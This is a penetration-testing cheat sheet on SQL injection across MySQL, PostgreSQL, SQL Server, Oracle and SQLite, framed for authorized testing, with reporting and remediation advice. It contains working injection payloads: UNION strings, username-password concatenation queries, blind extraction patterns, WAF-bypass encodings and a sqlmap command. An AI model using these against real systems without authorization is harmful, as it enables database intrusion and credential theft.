# SQL Injection — Database Enumeration & Data Extraction

> For authorized testing only. Use test data or the minimum data needed to prove impact. Do not dump unrelated user records.

## 1. Before Enumeration

Confirm:
- Vulnerable endpoint, parameter, and input context.
- DBMS and, if possible, version.
- Working technique: UNION, error-based, boolean-based, time-based, or OOB.
- UNION column count and a visible column, if using UNION.
- Current database account's read permissions.

A technique that works in one parameter may not work in another.

## 2. Identify Database, User, and Version

| DBMS | Current database | Current user | Version |
|---|---|---|---|
| MySQL / MariaDB | `DATABASE()` | `CURRENT_USER()` / `USER()` | `VERSION()` |
| PostgreSQL | `current_database()` | `current_user` | `version()` |
| SQL Server | `DB_NAME()` | `SYSTEM_USER` / `USER_NAME()` | `@@VERSION` |
| Oracle | `SYS_CONTEXT('USERENV','DB_NAME')` | `USER` | `v$version` |
| SQLite | `PRAGMA database_list` | No normal server user | `sqlite_version()` |

Oracle version query:
```sql
SELECT banner FROM v$version;
```

- **Purpose:** Establish the database context and account identity.
- **WAF tests:** Apply only syntax-valid encoding/comment/whitespace variants for the identified DBMS.
- **Limitations:** System functions and views may be restricted.

## 3. Find Schemas / Databases

### MySQL / MariaDB
```sql
SELECT schema_name FROM information_schema.schemata;
SELECT DATABASE();
```

### PostgreSQL
```sql
SELECT schema_name FROM information_schema.schemata;
SELECT current_schema();
```

### Microsoft SQL Server
```sql
SELECT name FROM sys.databases;
SELECT DB_NAME();
```

### Oracle
```sql
SELECT username FROM all_users;
SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual;
```

### SQLite
```sql
PRAGMA database_list;
```

- **Purpose:** Identify schemas/databases visible to the current account.
- **WAF tests:** Try accepted case, comment, whitespace, or encoding variants. Metadata alternatives are DBMS-specific.
- **Limitations:** Results depend on account permissions and database design.

## 4. Enumerate Tables

### MySQL / MariaDB
```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = DATABASE();
```

### PostgreSQL
```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = current_schema();
```

### Microsoft SQL Server
```sql
SELECT name FROM sys.tables;
```

### Oracle
```sql
SELECT table_name FROM user_tables;
```

Accessible tables in other schemas:
```sql
SELECT owner, table_name FROM all_tables;
```

### SQLite
```sql
SELECT name FROM sqlite_master WHERE type='table';
```

- **Purpose:** Find tables visible to the current account.
- **WAF tests:** Test DBMS-valid comments, case, whitespace, or encoding variants.
- **Limitations:** Views, temporary tables, ownership, and privileges affect results.

## 5. Enumerate Columns

### MySQL / MariaDB
```sql
SELECT column_name
FROM information_schema.columns
WHERE table_schema = DATABASE()
  AND table_name = 'users';
```

### PostgreSQL
```sql
SELECT column_name
FROM information_schema.columns
WHERE table_schema = current_schema()
  AND table_name = 'users';
```

### Microsoft SQL Server
```sql
SELECT c.name
FROM sys.columns AS c
JOIN sys.tables AS t ON c.object_id = t.object_id
WHERE t.name = 'users';
```

### Oracle
```sql
SELECT column_name
FROM user_tab_columns
WHERE table_name = 'USERS';
```

Oracle object names are commonly uppercase unless quoted.

### SQLite
```sql
PRAGMA table_info('users');
```

- **Purpose:** Find column names and available type information.
- **WAF tests:** Use the same valid encoding/comment/whitespace checks as table enumeration; try an engine-specific catalog alternative if needed.
- **Limitations:** Metadata visibility depends on privileges and object ownership.

## 6. UNION-Based Data Extraction

Use only after confirming column count and a displayable column.

### 6.1 Basic UNION pattern
```sql
' UNION SELECT NULL,NULL--
```

Replace one `NULL` at a time with a harmless marker:
```sql
' UNION SELECT 'TEST',NULL--
```

Match the original query's number of expressions and compatible data types.

### 6.2 Concatenate multiple columns

| DBMS | Expression |
|---|---|
| MySQL / MariaDB | `CONCAT(username,':',email)` |
| PostgreSQL | `username || ':' || email` |
| SQL Server | `username + ':' + email` |
| Oracle | `username || ':' || email` |
| SQLite | `username || ':' || email` |

Examples:
```sql
-- MySQL / MariaDB
SELECT CONCAT(username, '~', password) FROM users;

-- PostgreSQL / Oracle / SQLite
SELECT username || '~' || password FROM users;

-- SQL Server
SELECT username + '~' + password FROM users;
```

- **Purpose:** Display multiple fields through one reflected column.
- **WAF tests:** Case variation, valid comments/whitespace, URL encoding, and XML entities when the input is parsed as XML.
- **Limitations:** `NULL` concatenation and type conversion differ. SQL Server may need explicit `CAST`; Oracle query context may require `FROM dual`.

### 6.3 Limit the rows

```sql
SELECT username FROM users;
SELECT username FROM users WHERE username='test-user';
```

Pagination syntax:
- MySQL / PostgreSQL / SQLite: `LIMIT` and `OFFSET`.
- SQL Server: `ORDER BY ... OFFSET ... FETCH`.
- Oracle: `FETCH FIRST ... ROWS ONLY` or row-number techniques.

**Use the smallest proof possible:** a test account or one approved record is usually enough.

## 7. Error-Based Extraction

Error-based SQLi causes a chosen expression to appear in a database error that the application exposes.

- Confirm first that database errors are visible.
- Validate the channel with a harmless constant or test value.
- Avoid expressions that can crash the database or affect other users.

DBMS notes:
- MySQL / MariaDB: conversion and XML-related error functions vary by version.
- PostgreSQL: type-cast errors may expose the value being cast.
- SQL Server: conversion errors can include the failed value.
- Oracle: conversion errors and XML functions vary by version and permissions.
- SQLite: error behaviour is more limited and differs from server DBMSs.

- **WAF tests:** Use syntax-valid encoding/comment/whitespace variants. A bypass cannot make an unsupported function available.
- **Limitations:** Applications often suppress errors; output may be truncated or sanitized.

## 8. Boolean-Based Blind Extraction

When true and false conditions produce different responses, values can be inferred one question at a time.

### 8.1 Confirm the signal
```sql
' AND (1=1)--
' AND (1=2)--
```

### 8.2 Test a character

General idea:
```sql
SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'
```

Adapt row selection and substring syntax to the DBMS.

| DBMS | Character function | First-row pattern |
|---|---|---|
| MySQL / MariaDB | `SUBSTRING(value,1,1)` | `LIMIT 1` |
| PostgreSQL | `SUBSTRING(value FROM 1 FOR 1)` | `LIMIT 1` |
| SQL Server | `SUBSTRING(value,1,1)` | `TOP 1` or ordered offset |
| Oracle | `SUBSTR(value,1,1)` | `FETCH FIRST 1 ROW ONLY` |
| SQLite | `SUBSTR(value,1,1)` | `LIMIT 1` |

### 8.3 Check length first

| DBMS | Length function |
|---|---|
| MySQL / MariaDB | `LENGTH()` / `CHAR_LENGTH()` |
| PostgreSQL | `LENGTH()` |
| SQL Server | `LEN()` |
| Oracle | `LENGTH()` |
| SQLite | `LENGTH()` |

Then test each character position using equality or ranges. Binary search over character codes can reduce requests, but collation and multi-byte characters can affect comparisons.

- **WAF tests:** Try alternate function names only if supported; test valid encoding, comments, and whitespace variants for filtered tokens.
- **Limitations:** Needs a stable true/false signal. Case-insensitive collation and Unicode can complicate character checks.

## 9. Time-Based Blind Extraction

A conditional delay reveals whether a condition is true.

| DBMS | Delay primitive |
|---|---|
| MySQL / MariaDB | `SLEEP(seconds)` |
| PostgreSQL | `pg_sleep(seconds)` |
| SQL Server | `WAITFOR DELAY 'hh:mm:ss'` |
| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('x', seconds)` (permission/context dependent) |
| SQLite | No built-in portable sleep function |

Conceptual pattern:
```sql
CASE WHEN <condition> THEN <delay> ELSE <no-delay> END
```

- **Purpose:** Infer a hidden condition from response time.
- **WAF tests:** Encode punctuation or test valid DBMS-specific syntax alternatives.
- **Limitations:** Timing is noisy. Use short delays, repeat tests, and compare with baseline. Avoid long delays and large batches on production systems.

## 10. Out-of-Band (OOB) Confirmation

- **Purpose:** Observe a database-triggered DNS/HTTP callback when the normal response has no useful output.
- **Requirements:** Supported DBMS feature, permissions, outbound network access, and a controlled listener.
- **WAF tests:** Input encoding may affect request filtering; database egress controls are a separate layer.
- **Limitations:** OOB support depends on DBMS/version/configuration. Use a harmless unique token, never real user data. No callback does not rule out SQLi.

## 11. Stacked-Query Enumeration

A second statement may run if the application driver and connection allow multiple statements.

- **Purpose:** Check whether the injection point supports multiple statements.
- **WAF tests:** Semicolon encoding or comment/whitespace variants may affect simple filters.
- **Limitations:** Many drivers disable stacked queries. A semicolon alone is not proof of execution.

## 12. Second-Order SQLi Data Flow

- **Purpose:** Find stored input that is later used unsafely in another SQL query.
- **Workflow:** Submit a unique harmless marker → identify where it is stored → trigger the later workflow → compare behaviour → validate with a safe controlled condition.
- **WAF tests:** Inspect transformations at storage and later-use stages. The value may be decoded or normalized before the second query.
- **Limitations:** The initial save request may be safe. The vulnerable query may run in a later page, admin action, or background job.

## 13. DBMS Metadata Quick Reference

| Goal | MySQL / MariaDB | PostgreSQL | SQL Server | Oracle | SQLite |
|---|---|---|---|---|---|
| Current DB | `DATABASE()` | `current_database()` | `DB_NAME()` | `SYS_CONTEXT('USERENV','DB_NAME')` | `PRAGMA database_list` |
| Current user | `CURRENT_USER()` | `current_user` | `SYSTEM_USER` | `USER` | No normal server user |
| Tables | `information_schema.tables` | `information_schema.tables` | `sys.tables` | `user_tables` | `sqlite_master` |
| Columns | `information_schema.columns` | `information_schema.columns` | `sys.columns` | `user_tab_columns` | `PRAGMA table_info()` |
| Version | `VERSION()` | `version()` | `@@VERSION` | `v$version` | `sqlite_version()` |
| Concatenation | `CONCAT()` | `||` | `+` | `||` | `||` |

## 14. WAF Bypass by Extraction Technique

| Technique | Relevant bypass tests | Important note |
|---|---|---|
| Metadata enumeration | Case, comments, whitespace, URL encoding | Catalog syntax differs by DBMS |
| UNION extraction | Encode quotes/commas, valid comments, case variation, XML entities for XML bodies | Preserve column count and data types |
| Concatenation | Alternative operator/function, encoding, comments | Choose the DBMS-specific form |
| Error-based | Encode delimiters, valid comments, alternate conversion syntax | WAF bypass cannot force errors to be displayed |
| Boolean-based | URL encoding, whitespace, parentheses, equivalent conditions | Keep the true/false pair consistent |
| Time-based | Encode punctuation, DBMS-specific delay syntax | Keep delays short and repeat measurements |
| OOB | Input encoding only where request filtering applies | Egress controls are a separate issue |
| Stacked queries | Semicolon encoding, comment/whitespace variants | Driver must permit multiple statements |
| Second-order | Storage/use-stage encoding and normalization tests | Find the later query execution point |

### Common bypass forms

```text
URL encoding:       '       → %27
Space encoding:     space   → %20
Tab/newline:        %09 / %0a / %0d
Case variation:     UNION   → uNiOn
Inline comment:     UN/**/ION
XML hex entity:     U       → &#x55;
```

Use only when the request format and parser support it. XML entities are decoded by XML parsing; they are not universal SQL encoding. Double URL encoding (`%2527`) matters only when multiple decoding stages exist.

## 15. SQLMap Cross-Check (Optional)

```bash
sqlmap -r request.txt -p parameter --batch
```

- `-r request.txt`: Load the complete raw HTTP request from a file.
- `-p parameter`: Test only the named parameter.
- `--batch`: Use default answers instead of interactive prompts.

Use only against an authorized target. Start with narrow tests and avoid aggressive options. Automation output does not replace manual confirmation.

## 16. Reporting Evidence Checklist

- [ ] Endpoint, method, and parameter recorded.
- [ ] Authentication state and user role recorded.
- [ ] DBMS fingerprint supported by evidence.
- [ ] Injection technique and context explained.
- [ ] Minimal proof uses a harmless marker or approved test account.
- [ ] Only necessary data was accessed.
- [ ] Request/response evidence and timestamps saved.
- [ ] WAF behaviour documented separately from the SQLi root cause.
- [ ] Impact does not claim more than was proven.

## 17. Core Remediation

- Use parameterized queries / prepared statements.
- Never build SQL by concatenating untrusted input.
- Allowlist identifiers that cannot be parameterized, such as sort-column names.
- Give the application database account only required permissions.
- Show generic errors to users; keep detailed errors in protected logs.
- Treat WAF rules as defence-in-depth, not the primary SQLi fix.
